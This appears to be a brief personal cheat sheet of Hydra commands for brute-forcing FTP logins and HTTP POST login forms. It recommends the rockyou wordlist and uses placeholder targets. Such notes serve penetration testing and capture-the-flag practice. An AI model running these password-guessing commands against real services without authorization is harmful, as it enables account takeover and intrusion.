## FTP
```bash
hydra -l $user -P $wordlist $url ftp
```

Good wordlist 
```path
/usr/share/wordlists/rockyou.txt
```

## HTTP
```sh
hydra -L $wordlis -p dummyPassword $url http-post-form "/LOGIN_PAGE_PATH:USERNAME_FIELD=^USER^&PASSWORD_FIELD=^PASS^&OTHER_FORM_DATA:F=Invalid username." -V
```